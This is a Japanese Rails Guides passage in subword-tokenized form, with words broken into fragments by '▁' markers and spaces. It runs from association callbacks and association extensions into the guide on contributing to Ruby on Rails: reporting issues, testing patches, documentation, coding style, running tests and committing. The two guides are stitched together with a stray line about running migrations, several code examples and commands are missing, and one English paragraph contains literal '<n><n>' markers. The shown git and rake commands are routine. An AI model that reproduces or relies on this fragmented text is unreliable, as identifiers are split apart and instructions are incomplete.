▁ 関連付け の コールバック も 、 上 のような 通常の コールバック と だ いた い 同じです が 、 ( Active ▁Record オブジェクト ではなく ) コレクション の ラ イ フ サ イ ク ル によって イベント が トリガ される 点が 異なります 。
▁以下の 4 つの 関連付け コールバック を使用できます 。
▁* ▁` before _ add `
▁* ▁` after _ add `
▁* ▁` before _ remove `
▁* ▁` after _ remove `
▁これらの オプションを 関連付け の 宣言 に追加する ことで 、 関連付け コールバック を 定義 できます 。
▁has _ many ▁: orders , ▁ before _ add : ▁: check _ c r edit _ limit
▁def ▁ check _ c r edit _ limit ( order )
▁Rails は 、 追加 される オブジェクト や 削除 される オブジェクトを コールバック に ( 引数として ) 渡します 。
▁1 つの イベント で 複数の コールバック を使用したい場合 には 、 配列 を使用して 渡します 。
▁has _ many ▁: orders ,
▁ before _ add : ▁ [: check _ c r edit _ limit , ▁: c al c ul at e _ sh ip p ing _ cha r g es ]
▁def ▁c al c ul at e _ sh ip p ing _ cha r g es ( order )
▁` before _ add ` コールバック が 例外を発生 した 場合 、 オブジェクトは コレクション に追加 されません 。
▁ 同様に 、` before _ remove ` で 例外 が発生し た場合 も 、 オブジェクトは コレクション に 削除 されません 。
▁### ▁ 関連付け の 拡 張
▁Rails は自動的に 関連付け の プロキシ オブジェクトを ビ ル ド します が 、 開発者 は これを カスタマイズ することができます 。
▁ 無 名 モジュール ( an on y m o us ▁ module ) を使用して これらの オブジェクトを 拡 張 ( 検索 、 作成 などの メソッドを 追加 ) することができます 。
▁has _ many ▁: orders ▁do
▁def ▁ find _ by _ order _ prefix ( order _ number )
▁ find _ by ( re g ion _ id : ▁ order _ number [ 0 . . 2 ] )
▁ 拡 張 を 多くの 関連付け で 共有 したい場合は 、 名前付き の 拡 張 モジュール を使用する こともできます 。
▁ module ▁F in d Re c ent E x te n s ion
▁def ▁ find _ re c ent
▁ where (" created _ at ▁ > ▁ ? ", ▁5 . day s . ago )
▁has _ many ▁: orders , ▁-> ▁ { ▁ ext end ing ▁F in d Re c ent E x te n s ion ▁ }
▁has _ many ▁: deliver ies , ▁-> ▁ { ▁ ext end ing ▁F in d Re c ent E x te n s ion ▁ }
▁ 関連付け プロキシ の 内部 を参照 するには 、` pro x y _ association ` ア ク セ サ にある 以下の 3 つの 属性 を使用します 。
▁* ▁` pro x y _ association . own er ` は 、 関連付けを 所 有 する オブジェクト を返します 。
▁* ▁` pro x y _ association . ref le c tion ` は 、 関連付けを 記述 する リ フ レ ク ション オブジェクト を返します 。
▁* ▁` pro x y _ association . t ar get ` は 、` belongs _ to ` または ` has _ one ` 関連付け の オブジェクト を返す か 、` has _ many ` または ` has _ and _ belongs _ to _ many ` 関連付け オブジェクトの コレクション を返します 。
▁それでは マイグレーション を実行し ましょう 。
▁Ruby ▁on ▁Rails ▁ に 貢 献 する方法
▁ 本ガイドで は 、 Ruby ▁on ▁Rails の 開発 に 「 あなた 」 が 参 加 する方法について 説明します 。
▁* ▁ GitHub で issue を レポート する方法
▁* ▁ マ ス ター を c l one して テストスイート を実行する 方法
▁* ▁ 既存の issue を 解決 する方法
▁* ▁Ruby ▁on ▁Rails の ドキュメント に 貢 献 する方法
▁* ▁Ruby ▁on ▁Rails のコード に 貢 献 する方法
▁Ruby ▁on ▁Rails は 、「 ど こ か で 誰 か が うまく や って く れ ている フレームワーク 」 ではありません 。
▁Ruby ▁on ▁Rails には 、 長 年 に 渡 って 数 百 人 もの 人 々 が 貴 重 な 貢 献 を行って ください ました 。 その 内容 は 、 わずか 1 文字 の 修正 から 、 大 規 模 な アーキテクチャ 変更 、 重要な ドキュメント 作成 まで 多 岐 に 渡 ります 。 それらの 努 力 は 、 いずれ も Ruby ▁on ▁Rails を すべての 人 々 にとって より よい もの にする ことを 目 標 に 置 い ています
▁ コードを 書いた り ドキュメント を作成 したり する まで には 至 ら なくても 、 issue の レポート や パッチ のテスト など 、 さまざまな 方法で 貢 献 することができます ▁( 訳 注 : ▁** サンプル の 文 章 も 日 本 語 に 翻 訳 されています が 、 実際には 必ず 英語 を使う ように してください ** ▁ )。
▁ issue の レポート
▁Ruby ▁on ▁Rails では [ GitHub の I s s u e ト ラ ッ キ ング ]( https :// github . com / rails / rails / issue s ) 機能 を使用して issue を ト ラ ッ キ ング しています 。 主 に バグ や 、 新しい コードの 貢 献 に 使用されます 。
▁Ruby ▁on ▁Rails で バグ を見つけ たら 、 そこ から 貢 献 を 開 始 できます 。
▁ Git h ub への issue 送信 、 コメント 、 プルリクエスト の作成 を行う には 、 まず GitHub アカウント ▁( 無料 ) ▁ を 作成する必要があります 。
▁NOT E : ▁Ruby ▁on ▁Rails の 最 新 リリース で 見つけ た バグ は 最も 注 目 を 集 め る 可能性があります 。
▁また 、 Rails コア チ ー ム は 、 _ ed g e ▁Rails _ ▁( その 時点 で の 開発 版 Rails のコード ) ▁ で のテスト に 時間 を 割 い てくれる 方 から の フィード バ ッ ク を 常に 歓迎 しています 。
▁ テスティング 用 に ed g e ▁Rails を 入 手 する方法について は 後 述 します 。
▁### ▁ バグ レポート を作成する
▁< n >< n > I f ▁you ' ve ▁f ound ▁a ▁ pro b le m ▁in ▁Ruby ▁on ▁Rails ▁ w h i ch ▁is ▁ not ▁a ▁ security ▁ ri s k , ▁do ▁a ▁ search ▁in ▁ GitHub ▁ u nder ▁[ I s s u es ]( https :// github . com / rails / rails / issue s ) ▁in ▁ case ▁it ▁has ▁ al read y ▁be en ▁ re port ed . ▁I f ▁you ▁do ▁ not ▁ find ▁ any ▁ issue ▁ address ing ▁it ▁you ▁ ma y ▁ pro ce ed ▁to ▁[ o p en ▁a ▁ new ▁on e ]( https :// github . com / rails / rails / issue s / new ).
▁ セキュリティ上の issue を レポート する方法について は 次の セクション で説明します 。
▁ issue レポート には 、 最 低 でも タイトル と issue の 明 快 な 説明 が必要です 。
▁ できる だけ 多くの 関連 情報 を含め るように してください 。 また 、 少なくとも 問題 を 再 現 できる コード サンプル も 合わせ て 投 稿 してください 。
▁ 期 待 される 動作 が行われ ていない ことを 示す 単 体 テスト も 含 め ても ら え ると さらに 助 か ります 。
▁ バグ の 再 現 と 修正 点 の 把 握 を 、 他の 人 達 にとって も 自分自身 にとって も や り や す く すること を 目 指 してください 。
▁ そして 、 issue の 扱 い について 過 度 な 期 待 を 抱 か ないこと も 肝 心 です 。
▁ 「 地 球 滅 亡 クラス 」 の 重 大 な 問題 でも ない 限 り 、 レポート しても ら った issue は 他の issue と同様に 、 解決 に 向け て 共 同 作業 が行われ る ようになります 。
▁ issue レポート が自動的に 修正 担 当 者 を見つけ てくれる ことも ありません し 、 他の 開発者 が 自分の 作業 を 差 し 置 いて まで 修正 してくれ ること も ありません 。
▁ issue を作成する ということ は ほとんど の場合 、 自分 にとって は 問題 修正 の ス ター ト ラ イン に 着 く こと であり 、 他の 開発者 にとって は 「 こ ち ら でも 同じ 問題 が 起 き て ます 」 と 確認 および コメント を追加する 場所 が できた ということ に 過 ぎ ません 。
▁### ▁ セキュリティ issue の 特殊な 取り 扱 い 方法 について
▁WARN ING : ▁ セキュリティ 脆弱性 に関する 問題 は 、 一 般 公開 されている Git h ub の issue レポート 機能 には 「 絶 対 に 掲 載 しないでください 」 。
▁ セキュリティ 関連 の issue を扱う 方法 の詳細については 、[ Rails セキュリティ ポ リ シ ー ページ ]( http :// rubyonrails . org / security ) ▁( 英語 ) ▁ を参照してください 。
▁### ▁ 機能 リクエスト について
▁ GitHub の I s s u e には 「 機能 リクエスト 」 を 記 入 しないでください 。
▁Ruby ▁on ▁Rails で 欲 しい 機能 がある なら 、 自分 で コードを 書い てください 。 あるいは 、 誰 か に お 願 い して コードを 書い ても ら って ください 。
▁Ruby ▁on ▁Rails 用の パッチ を 提 案 する方法について は 後 述 します 。
▁ たとえ GitHub の issue に このような 「 欲 しい 機能 リスト 」 を コード も 添 え ずに 書き 込 んだ ところで 、 I s s u e を チェック した 人 によって 早 晩 「 無効 」 と マ ー キ ング されて 終 わ る でしょう 。
▁その 一方 、「 バグ 」 と 「 機能 」 の 線 引 き は そう 簡単 では ない こともあります 。
▁ 一般に 、「 機能 」 は アプリケーションに 新しい 振る舞い を追加する もの であり 、 バグ とは 既存の 振る舞い が 期待どおり で ないこと を示します 。
▁ コア チ ー ム は 、 必要に応じて バグ か 機能 か を 審 査 するための 招 集 を かけ る こともあります 。
▁ とは い う もの の 、 バグ か 機能 か の違い は 、 送 って い ただ いた パッチ を ▁( ボ ツ にする かどうか という より は ) 、 どの リリース に 反 映 するか という 扱 い の違い で しか ないこと が ほとんど です 。 バグ 修正 は 早 め に リリース され 、 機能 追加 は 大きな リリース 変更 の ときに 反 映 される といった 具 合 です 。 私 た ち は 、 修正 パッチ と同様に 機能 追加 も 大 歓迎 しています 。
▁ 送 って い ただ いた 機能 追加 を メ ン テ ナ ン ス 用 ブランチ に 押 し 込 め て お し ま い 、 という ようなこと は していません 。
▁ 機能 追加 用の パッチ を 送信 する 前に 自分の アイディア に 意 見 を 募 り たい場合は 、[ rails - core メ ー リ ング リスト ]( https :// group s . g oo g le . com / for um / ? from group s # ! for um / rubyonrails - core ) に メールを送信 してください 。 も し 誰 から も 返 信 が なければ 、 自分の アイディア に 誰 も 関 心 を 持 っ ていない という ことがわかります 。
▁ あるいは 、 自分の アイディア に 興 味 を 示 し てくれる 人 が 返 信 し てくれる かもしれません 。
▁ あるいは 「 悪 い け ど それ は 採 用 でき そう に ない ね 」 という 返 信 かもしれません 。
▁しかし この メ ー リ ング リスト は 、 こう した アイディア について 議 論 するために 用 意 された 場所 です 。
▁ 逆 に GitHub の issue は 、 こう した 新しい アイディア のために 必要な 議 論 ▁( ときに は 長 期 かつ 複 雑 になる ことも ある でしょう ) ▁ を行う ための 場所 ではありません 。
▁ 既存の issue の 解決 を 手 伝 う
▁-- ---------------- ----------------
▁ issue の レポート に 続 く 貢 献 方法 として 、 コア チ ー ム が 既存の issue を 解決 する の を 手 伝 う こともできます 。
▁ Git h ub の issue に あ が っている [ 皆 から の issue ]( https :// github . com / rails / rails / issue s ) を見 てみると 、 注 目 を 集 め ている issue が たくさん 見つか ります 。
▁ 自分 も 何か issue に 貢 献 できる 方法は ある でしょう か 。
▁もちろん あります 。 それ も い ろ ん な 方法 があります 。
▁### ▁ バグ レポート の 確認
▁ 初 歩 的な 貢 献 として 、 バグ レポート を確認する 作業 も 大 変 役 に 立 ち ます 。
▁ issue を 自分の コンピュータ で 再 現 できる かどうかを 試 してみましょう 。
▁ 問題 を うまく 再 現 できた ら 、 その ことを issue の コメント に追加 しましょう 。
▁ 再 現 手順 など に あ い ま い な 点 がある なら 、 ど こ が わかり にくい か を 指 摘 しましょう 。
▁ バグ を 再 現 するために 有 用 な 情報 を追加した り 、 不要な 手順 を削除し たり する の も 重要な 貢 献 です 。
▁ テストが 添 え られ ていない バグ レポート を見 かけ たら 、 貢 献 の チ ャ ン ス です 。 バグ が 原 因 で 失敗する テスト を作成して 貢 献 できます 。
▁ テスト の 書き 方は 、 既存の テスト ファイルを 詳 しく 読 む ことで 学 べ ます 。 これは 、 Rails の ソースコード を み っ ち り 探 索 するための よい き っ かけ にも なります 。
▁ 作成する テストは 「 パッチ 」 の 形式 に しても ら え ると ベ スト です 。 詳 しく は 「 Rails のコード に 貢 献 する 」 で 後 述 します 。
▁ バグ レポート は 、 と に か く 簡潔 で わかりやすく 、 そして なるべく 簡単に 現 象 を 再 現 できるように 書い てください 。 バグ を修正する 開発者 にとって 何 より あり が たい のは 、 このような 「 よい バグ レポート 」 です 。 たとえ バグ レポート を作成する あなた が 最終的に コードを 書 か なくても 、 よい バグ レポート は 大きな 貢 献 となります 。
▁### ▁ パッチ をテストする
▁ GitHub から Ruby ▁on ▁Rails に 送信された プルリクエスト ▁( pull ▁ request 、 プ ル リ ク とも ) ▁ を チェック し てくれる 人 も いる と 助 か ります 。
▁ 寄 せ られ た 修正 を 適 用 するには 、 まず 次のように 専 用の ブランチ を作成 してください 。
▁$ ▁git ▁ checkout ▁- b ▁ testing _ branch
▁続いて 、 この リモート ブランチ を使用して ローカル のコード ベース を更新し ます 。
▁たとえば GitHub ユーザー である John S m i th が 、 for k して https :// github . com / John S m i th / rails の " o range " という トピックブランチ に push した とします 。
▁$ ▁git ▁ remote ▁ add ▁ John S m i th ▁git :// github . com / John S m i th / rails . git
▁$ ▁git ▁ pull ▁ John S m i th ▁ o range
▁ ブランチ を 適 用 した ら テスト してみます 。
▁ 次のような 点に注意 し ながら 進め ましょう 。
▁* ▁ 修正 は 本当に 有効 か 。
▁* ▁この テスト で 自分 は 幸 せ に な れる か 。
▁ 何 が テスト されている のか を 自分 が 理解 でき ている か 。
▁ 足 り ない テストは ない か 。
▁* ▁ ドキュメント に 適切な 記 載 がある か 。
▁ ドキュメント も 更新 する 必要がある か 。
▁* ▁ 実装 が 楽 しい と 思える か 。
▁ 同じ 変更を もっと 高速 かつ 素晴らしい 方法で 実装 する方法 を 思い 付け る か 。
▁ プルリクエスト に 含 まれ ている 変更 点が よい もの である と 思 え たら 、 GitHub の issue に 賛 成 を 表 明 ( app r o v al ) する コメント を追加し てください 。
▁ 追加 する コメント では 、 まず その 変更 に 賛 成 している ことを 表 明 し つ つ 、 なるべく 具 体 的に どの 変更 点が よい と 思 った のか についても 示 しましょう 。
▁たとえば 次のように コメント します 。
▁ > I ▁ li ke ▁the ▁ w a y ▁you ' ve ▁ re structure d ▁that ▁ code ▁in ▁ generate _ find er _ sql ▁- ▁ m u ch ▁ n i c er . ▁( generate _ find er _ sql のコード が 非常に よい 形 で 再 構 築 されている 点が よい と思います )。
▁ The ▁ tests ▁ lo o k ▁ g oo d ▁to o . ▁( テスト も よく 書 け ている よう です )。
▁ 単 に 「 + 1 」 と あり が ち な コメント を 残 す だけで は 、 他の レ ビ ュ ア ー は ほとんど 注 目 してくれ ない でしょう 。
▁ コメント する あなた が 十分 時間 を かけ て プルリクエスト を 読 んだ ということ が 皆 に 伝 わ るように 書き ましょう 。
▁Rails の ドキュメント に 貢 献 する
▁--------- --------------- ---------------
▁Ruby ▁on ▁Rails には 2 種類 の ドキュメント があります 。 ひとつ はこの ガイド であり 、 Ruby ▁on ▁Rails を学ぶ ためのものです 。 もうひとつ は API ドキュメント であり 、 こ ち ら は リ フ ァ レ ン ス 用 です 。
▁ ど な た でも Rails ガイド の 改 善 に 貢 献 することができます 。 Rails ガイド に 求 め られ る 改 善 とは 、「 一 貫 している こと 」 「 矛 盾 が ないこと 」 「 読み やすい こと 」 「 情報 の 追加 」 「 事 実 と 異 な っている 部分 の 修正 」 「 タ イ ポ の 修正 」 「 最新の ed g e ▁Rails に 追 い 付 く こと 」 など です 。
▁[ Rails ]( http :// github . com / rails / rails ) に プルリクエスト を 送 ることができます 。 常 連 貢 献 者 になった ら 、[ Rails コア チ ー ム ]( http :// rubyonrails . org / core ) に
▁ただし 、 doc rails には プルリクエスト を 送信 しないでください 。 自分 で 書いた 変更 への 意 見 が 欲 しい 場合は 、[ Rails ]( http :// github . com / rails / rails ) の 方 で お 願 い します 。
▁ doc rails は 定 期 的に master に マージ されます ので 、 Ruby ▁on ▁Rails ドキュメント の 編集 を 効率 よく 行 え ます 。
▁ ドキュメント の 変更 内容 について 不 明 な 点 がある場合 は 、 GitHub の [ Rails ]( https :// github . com / rails / rails / issue s ) ▁ issue ト ラ ッ カ ー で issue を作成 してください 。
▁ ドキュメント 関連 で 貢 献 したい場合は 、[ API ▁ ドキュメント 作成 の ガイド ラ イン ]( api _ document ation _ guid e line s . html ) ▁ と [ Rails ▁ ガイド の ガイド ラ イン ]( ruby _ on _ rails _ guides _ guid e line s . html ) ▁ を よく 読んで から に してください 。
▁NOT E : ▁ 前 述 の とおり 、 コード に パッチ を 当 て る 際に は 、 ドキュメント も それ に 対応 して 適切に 書かれ る必要があります 。
▁ doc rails は 、 コ ー デ ィ ング から 独 立 した ド キ ュ メ ン テ ー ション のみ を 目的 と しています 。
▁NOT E : ▁Rails の C I ▁( 継 続 的 イン テ グ レ ー ション : ▁C on t in u o us ▁ In te gra tion ) ▁ サーバー の 負 荷 を 減 ら す ために 、 ドキュメント 関連 の コミット メッセージ には [ c i ▁ skip ] と 記 入 してください 。 こうすることで 、 コミット 時の ビ ル ド は スキップ されます 。
▁[ c i ▁ skip ] ▁ は 「 ドキュメント のみ の 変更 」 以外 では 使用 できません 。 コードの 変更 には 絶 対 使用 しないでください 。
▁WARN ING : ▁ doc rails には 次の 厳 格 な ポ リ シ ー が 制 定 されている ことを 理解 しておく必要があります : ▁ 「 doc rails のコードは 1 文字 たり とも 絶 対 に変更 し ないこと 」
▁ 「 doc rails で 変更 して よい のは R D o c と ガイド のみ 」
▁ 「 doc rails の change log も 絶 対 に変更 し ないこと 」
▁Rails のコード に 貢 献 する
▁### ▁ development 環境 を 構 築 する
▁ バグ レポート を送信し て 既存の 問題 解決 を 手 伝 った り 、 コードを 書い て Ruby ▁on ▁Rails に 貢 献 したり するために は 、 ぜ ひ とも テストスイート を 実行 できるように しておく必要があります 。
▁この セクション では 、 自分の パ ソ コ ン 上で テスト 用の 環境 を 構 築 する方法 について解説します 。
▁#### ▁ お す す め の 方法
▁[ Rails ▁ development ▁ box ]( https :// github . com / rails / rails - de v - box ) にある でき あ い の development 環境 を 入 手 する の が お す す め です 。
▁#### ▁ 面倒 な 方法
▁Rails ▁ development ▁ box を 利用 できない 事 情 がある場合 は 、 Rails ガイド の [ Rails コア 開発環境 の 構 築 方法 ]( development _ de p end en c ies _ install . html ) を ご 覧 ください 。
▁### ▁Rails リポジトリ を ク ロー ン する
▁ コード に 貢 献 するには 、 まず Rails リポジトリ を ク ロー ン する ところ から 始 め る必要があります 。
▁$ ▁git ▁c l one ▁git :// github . com / rails / rails . git
▁続いて 、 専 用の ブランチ を作成します 。
▁$ ▁ cd ▁ rails
▁$ ▁git ▁ checkout ▁- b ▁ my _ new _ branch
▁この ブランチ の名前 は ローカル コンピュータ の 自分の リポジトリ 上で しか 使われ ないので 、 どんな 名前 でも 構 いません 。
▁この 名前 が Rails ▁ Git リポジトリ に そのまま 取り 込 まれ る ことはありません 。
▁### ▁ ローカル ブランチ で アプリケーション を実行する
▁ ダ ミ ー の Rails アプリ で 変更 をテストする 必要がある 場合は 、` rails ▁ new ` に ` - - de v ` フラグ を追加する と 、 ローカル ブランチ を使用する アプリケーション が 生成されます 。
▁$ ▁bundle ▁exec ▁ rails ▁ new ▁ ~ / my - test - app ▁-- de v
▁` ~ / my - test - app ` で 生成された アプリケーション は ローカル ブランチ のコード を実行します 。 サーバーを再起動 すると 、 設定 の 変更を アプリケーションで 確認 できます 。
▁### ▁ コードを 書く
▁ 体 制 が 整 った ので 、 早 速 コードを 追加 ・ 編集 しましょう 。
▁ 現在の Git ブランチ で 存 分 に コードを 書く ことができます ▁( 念 の ため ` git ▁ branch ▁- a ` を実行して 、 正しい ブランチ に いる ことを確認 しておきましょう )。
▁ 自分の コードを Rails に追加する のであれば 、 以下の 点 を 心 が け てください 。
▁* ▁ 正しい コードを 書くこと 。
▁* ▁Rails で 皆 が 使用している 慣 例 や ヘルパーメソッド を使用すること 。
▁* ▁ テストを書く こと 。 自分の コード がない と 失敗 し 、 ある と 成功 する テスト であること 。
▁* ▁ 関連する ドキュメント 、 実行 例 、 ガイド など 、 コードが 影 響 する 部分 はすべて 更新 すること 。
▁ TIP : ▁ 表 面 的な もの に と ど ま る 変更 や 、 Rails の 安 定 性 / 機能 性 / テスト の し や す さ の 根 本 的な 部分を 何も 改良 しない ような 変更 は 受け 付け られ ません 。 詳 細 については ▁[ our ▁ r ation al es ▁be h in d ▁this ▁ de c is ion ]( https :// github . com / rails / rails / pull /1 3 7 7 1 # issue comment - 3 27 4 6 7 00 ) ▁( 英語 ) ▁ を参照してください 。
▁#### ▁Rails コ ー デ ィ ング ルール に従う
▁Rails の コ ー デ ィ ング を行う 場合は 、 以下の シンプルな スタイル ガイド に従い ます 。
▁* ▁ インデント は スペース 2 つ を使用する 。 タブ 文字 は 使用 し ないこと 。
▁* ▁ 行 末 に スペース を 置 か ないこと 。
▁ 空 行 に 余 分 な スペース を 置 か ないこと 。
▁* ▁ private や protected の 後 の 行 は インデント する 。
▁* ▁ ハッシュの 記 法 は ▁Ruby ▁1. 9 ▁ 以降 の 書 式 を使用する 。
▁つまり 「 ` { ▁: a ▁=> ▁: b ▁ } ` 」 よりも 「 ` { ▁a : ▁: b ▁ } ` 」 が 望 ま しい 。
▁* ▁ 「 ` and ` / ` or ` 」 よりも 「 ` & & ` / ` | | ` 」 が 望 ま しい 。
▁* ▁ クラス メソッドは 「 self . method 」 よりも 「 class ▁< < ▁self 」 が 望 ま しい 。
▁* ▁ 等 号 の 前 後に は スペース を 置 く 。 「 ` a = b ` 」 ではなく 「 ` a ▁= ▁ b ` 」 と すること 。
▁* ▁ ref u te ではなく assert _ not を使用すること 。
▁* ▁ 単 一 行 ブロック は スペース 無 し の 「 ` method { do _ st u f f } ` 」 よりも スペース あり の 「 ` method ▁ { ▁do _ st u f f ▁ } ` 」 が 望 ま しい 。
▁* ▁ その他 、 Rails のコード にある 既存の 書 式 に従う こと 。
▁ 上 は あ く まで ガイド ラ イン であり 、 最 適 な 使用 方法 については 各 自 で ご 判 断 ください 。
▁### ▁ ベ ン チ マーク を行う
▁ 自分の 書いた コード によって Rails の パ フ ォ ー マ ン ス が 低 下 する のであれば 、 比 較 のために [ b en ch m ar k - ip s ]( https :// github . com / e v an ph x / b en ch m ar k - ip s ) ▁gem を使用して ベ ン チ マーク の 結果 も 添 え てください 。
▁be n ch m ar k - ip s の 実行 例 を以下に示します 。
▁詳細については 、 b en ch m ar k / ip s ▁ の ▁[ README ]( https :// github . com / e v an ph x / b en ch m ar k - ip s / b lo b / master / README . m d ) を参照してください 。
▁### ▁ テスト を実行する
▁Rails では 、 変更を プッシュ する 時に テストスイート を フル 実行 する という 慣習 がある わけではありません 。
▁ お す す め の ワ ー ク フ ー ロー [ rails - de v - box ]( https :// github . com / rails / rails - de v - box ) で 説明 している ように 、 railties のテスト は 特に 時間 が か か り 、 ソースコード を ` / v a gra n t ` に マウント すると さらに 時間 が か か ります 。
▁ 現 実 的な 妥 協 案 として 、 作成した コード によって 影 響 が 生じる かどうかを テスト するようにしてください 。 そして 、 変更 が railties で 行 わ れ ていない のであれば 、 影 響 を 受け る コンポーネント の すべての テストスイート を実行して ください 。
▁ テスト に すべて パス すれば 、 貢 献 を 提 案 する 準備 が 整 います 。
▁Rails ▁ では 、 他の 箇所 で 予 想 外 の エラー が生じ たとき に 検出 できる よう 、[ T r a v is ▁C I ]( https :// tr a v is - c i . org / rails / rails ) を使用しています 。
▁#### ▁Rails ▁ 全体 のテスト を実行する
▁ すべての テスト を実行する には 以下のように します 。
▁$ ▁bundle ▁exec ▁rake ▁test
▁#### ▁ 特定の コンポーネント のテスト を実行する
▁Action ▁P ack など 、 特定の コンポーネント のテスト のみ を実行する こともできます 。
▁たとえば 、 Action ▁Mailer の場合は 以下 を実行します 。
▁$ ▁ cd ▁ action mailer
▁#### ▁ 単 一 のテスト を実行する
▁Ruby で 単 一 のテスト を実行する ことができます 。
▁たとえば 次の ようになります 。
▁` - n ` オプション を指定すると 、 ファイル 全体 ではなく 指定 した 単 一 の メソッド だけ を実行します 。
▁#### ▁Active ▁Record をテストする
▁ SQLite 3 ▁ のみ 、 Active ▁Record のテスト で 以下 を実行します 。
▁$ ▁ cd ▁ active record
▁$ ▁bundle ▁exec ▁rake ▁test : sqlite 3
▁これで 、` sqlite 3 ` で 行った 場合 と同様に テストを 実行 できるようになります 。
▁ タスク は それぞれ 以下の ようになります 。
▁test : my sql
▁test : my sql 2
▁test : postgresql
▁最後に 以下 を実行します 。
▁これで 4 つ が 順に 実行されます 。
▁ 単 一 のテスト を 個 別 に 実行 することもできます 。
▁$ ▁A R C ON N = sqlite 3 ▁ ruby ▁- I test ▁test / case s / association s / has _ many _ association s _ test . rb
▁ ひとつ のテスト を すべての ア ダ プ ター に対して 実行 するには 以下のように します 。
▁$ ▁bundle ▁exec ▁rake ▁ T E S T = test / case s / association s / has _ many _ association s _ test . rb
▁これで ` test _ j db c my sql `、` test _ j db c sqlite 3 `、` test _ j db c postgresql ` も 呼び出され ます 。
▁ 特定の データベース テスト に ター ゲ ッ ト を 絞 って 実行 する方法 の詳細については ` active record / R U N N ING _ U N I T _ T E S T S . rdoc ` を参照してください 。 C I ▁( Co n t in u o us ▁ In te gra tion : ▁ 継 続 的 イン テ グ レ ー ション ) サーバー で テストスイート を実行する 方法 の詳細については ` c i / tr a v is . rb ` を参照してください 。
▁### ▁ 警 告
▁ テストスイート の 実行 では 、 警 告 表示 が オン になります 。
▁Ruby ▁on ▁Rails のテスト で 警 告 が ひとつ も 表示 され ない の が 理 想 ですが 、 サ ー ド パ ー テ ィ の もの も 含 め て 若 干 の 警 告 が表示され てしまう ことがあります 。
▁ 無視 する という 手 もあります が 、 可能 であれば 修正 を お 願 い します 。 そして でき れば 、 新しい 警 告 を表示し ないように するための パッチ の 送信 も お 願 い します 。
▁ 出力 を見 や す く するために フラグ を オーバーライド することもできます ▁( ただし オプション の 意味 を 十分 理解 した う え で ですが )。
▁$ ▁ R U B Y O P T = - W 0 ▁bundle ▁exec ▁rake ▁test
▁### ▁C H A N G E L O G の 更新
▁C H A N G E L O G は すべての リリース で 重要な 位 置 を 占 め ます 。
▁Rails の 各 バージョンの 変更 点 を ここに 記 録 します 。
▁ リファクタリング や ドキュメント 変更 の場合は C H A N G E L O G を変更 しないでください 。
▁ 必要 であれば 複 数 行 に わ た って エ ン ト リ を 記 入 したり 、 スペース 4 つの インデント を 置 いた コード 例 を 記 入 したり することもできます 。
▁ 変更 が 特定の issue に 関連する 場合は 、 issue 番号 も 記 入 してください 。
▁C H A N G E L O G エ ン ト リ の例 を以下に示します ▁( ▁** 訳 注 : ▁ 実際 は 英語 で 書き ます ** ▁ )。
▁* ▁( 変更 内容 の 要 約 を 記 入 します )
▁( 複 数 行 の
▁ エ ン ト リ を 記 入 する 場合は 8 0 文字 目 で 折 り 返します )
▁( 必要に応じて インデント 付き のコード 例 を 追加 できます )
▁class ▁F oo
▁def ▁ bar
▁ put s ▁' baz '
▁end
▁end
▁( コード 例 に 続けて エ ン ト リ を 書く こともできます 。 issue 番号 は ここに 書き ます )
▁ G H # 1 23 4
▁* 自分の 名前 *
▁### ▁ Gemfile . lock を更新する
▁ そのような 場合は 、` bundle ▁ update ` ▁ を実行して 正しい 依 存 関係 バージョン を 反 映 し 、 変更 の ` Gemfile . lock ` ファイルに コミット してください 。
▁### ▁ 健 全 性 チェック
▁ コード に 目 を 通 した の が 自分 以外に い ない 状態 で コードを 送信 する のは よく ありません 。
▁ 身 近 に Rails 使い が いる 場合は 、 送信 前に コードを 詳 しく チェック しても ら い ましょう 。
▁ 身 近 に Rails 使い が い ない場合は 、 I R C ル ー ム や rails - core メ ー リ ング リスト で お 問 い 合わせ ください 。
▁### ▁ 変更を コミット する
▁ 自分の P C 上のコード に 満 足 が い く ようになった ら 、 変更を Git に コミット します 。
▁$ ▁git ▁ commit ▁- a
▁ 短 い 要 約 文 ▁( 50 ▁ 文字 以下 だと 理 想 的 )
▁もちろん 、 必要 であれば もっと 詳 しく 書い てください 。
▁ メッセージ は 7 2 文字 目 で 改 行 してください 。
▁class ▁Article sController
▁def ▁ index
▁ 箇 条 書き の 点 を追加する こともできます 。
▁ TIP : ▁ コミット が 複 数 に わ た っている 場合は 、 必ず ▁1 ▁ つの コミット に ス カ ッ シ ュ ( s q u a sh ) して おいてください 。
▁### ▁ ブランチ を更新する
▁ ローカル で 作業 している 間 に 、 master で 別の 更新 が 行われている ということ が よく あります 。
▁ 更新 を ローカル に 取り 込 みましょう 。
▁$ ▁git ▁ checkout ▁ master
▁$ ▁git ▁ pull ▁-- re base
▁続いて 、 最新の 変更 の ト ッ プ に パッチ を 再度 適 用 しましょう 。
▁$ ▁git ▁ checkout ▁ my _ new _ branch
▁$ ▁git ▁ re base ▁ master
▁ コ ン フ リ ク ト は 生 じ なかった か 、
▁ テストは パス するか 、
▁ 取り 込 んだ 変更 は 納 得 できる 内容 か 。
▁ それら を 確認 して から 次に 進 みましょう 。
▁### ▁ フ ォ ー ク
▁Rails ▁[ GitHub リポジトリ ]( https :// github . com / rails / rails ) ▁ を開いて 、 右 上 隅 にある ▁[ F or k ] ▁ を 押 します 。
▁ ローカル P C 上の ローカル リポジトリ に 新しい リモート を追加します 。
▁$ ▁git ▁ remote ▁ add ▁ m in e ▁git @ github . com : < 自分の ユーザー名 > / rails . git
▁ リモート に プッシュ します 。
▁$ ▁git ▁ push ▁ m in e ▁ my _ new _ branch
▁ フ ォ ー ク した リポジトリ を ローカル に ク ロー ン し 、 オ リ ジ ナ ル の Rails リポジトリ を リモート として 追加 することもできます 。 このような 場合は 次のように 行う 必要があります 。
▁ フ ォ ー ク の ク ロー ン を保存し た ディレクトリ で 以下 を実行します 。
▁$ ▁git ▁ remote ▁ add ▁ rails ▁git :// github . com / rails / rails . git
▁Rails の 公式 リポジトリ から 新しい コミット と ブランチ を ダウンロード します 。
▁$ ▁git ▁f e t ch ▁ rails
▁ ダウンロード した 新しい コンテンツ を マージ します 。
▁$ ▁git ▁ re base ▁ rails / master
▁ フ ォ ー ク を アップ デ ート します 。
▁$ ▁git ▁ push ▁ origin ▁ master
▁ 別の ブランチ を アップ デ ート したい場合は 以下のように します 。
▁$ ▁git ▁ checkout ▁ branch _ name
▁$ ▁git ▁ re base ▁ rails / branch _ name
▁$ ▁git ▁ push ▁ origin ▁ branch _ name
▁### ▁ プルリクエスト を 発行する
